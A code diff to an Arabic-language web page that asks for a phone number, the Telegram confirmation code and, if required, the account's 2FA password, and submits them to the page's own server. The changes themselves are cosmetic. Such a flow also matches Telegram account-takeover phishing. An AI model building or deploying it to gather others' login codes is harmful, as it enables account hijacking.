@@ -150,7 +150,6 @@
             cursor: not-allowed;
         }
 
-        /* دائرة التحميل (Spinner) */
         .spinner {
             width: 20px;
             height: 20px;
@@ -166,18 +165,15 @@
             to { transform: rotate(360deg); }
         }
 
+        .hidden {
+            display: none !important;
+        }
+
         .error {
             color: #e74c3c;
             font-size: 13px;
             margin-top: 12px;
             font-weight: 500;
-            animation: shake 0.4s ease;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-5px); }
-            40%, 80% { transform: translateX(5px); }
         }
 
         .success-card {
@@ -220,14 +216,14 @@
             <button id="btn-phone" onclick="sendCode()">متابعة</button>
         </div>
 
-        <!-- خطوة إدخال الرمز وكلمة المرور الاختيارية -->
+        <!-- خطوة إدخال الرمز -->
         <div id="step-code" class="step-container hidden">
             <div class="input-group">
                 <label>رمز التأكيد</label>
                 <input type="text" id="code" placeholder="أدخل الرمز المرسل إلى تطبيقك">
             </div>
             
-            <!-- خانة كلمة المرور المخفية تظهر ذكياً بالانيميشن -->
+            <!-- خانة كلمة المرور مخفية بالكامل ولا تظهر إلا إذا طلبها الحساب حصراً -->
             <div id="password-group" class="input-group hidden" style="margin-top: 16px;">
                 <label style="color: var(--tg-link-color);">كلمة مرور الحساب (2FA)</label>
                 <input type="password" id="password" placeholder="أدخل كلمة المرور الخاصة بك">
@@ -259,7 +255,6 @@
 
             currentPhone = phone;
             
-            // إظهار دائرة التحميل وتعطيل الزر
             const originalText = btn.innerHTML;
             btn.innerHTML = 'جاري الإرسال <span class="spinner"></span>';
             btn.disabled = true;
@@ -273,10 +268,8 @@
                 const data = await res.json();
 
                 if (data.success) {
-                    // انيميشن الانتقال الناعم بين الصفحات
                     document.getElementById('step-phone').classList.add('hidden');
-                    const codeStep = document.getElementById('step-code');
-                    codeStep.classList.remove('hidden');
+                    document.getElementById('step-code').classList.remove('hidden');
                     
                     document.getElementById('title').innerText = 'أدخل رمز التحقق';
                     document.getElementById('subtitle').innerText = 'تم إرسال رمز إلى حسابك على تيليغرام.';
@@ -325,9 +318,8 @@
                         </div>
                     `;
                 } else if (data.needPassword) {
-                    // إظهار حقل كلمة المرور بسلاسة
-                    const pwdGroup = document.getElementById('password-group');
-                    pwdGroup.classList.remove('hidden');
+                    // إظهار خانة كلمة المرور حصراً عند الحاجة
+                    document.getElementById('password-group').classList.remove('hidden');
                     msgDiv.style.color = '#e67e22';
                     msgDiv.innerText = data.error;
                     btn.innerHTML = originalText;
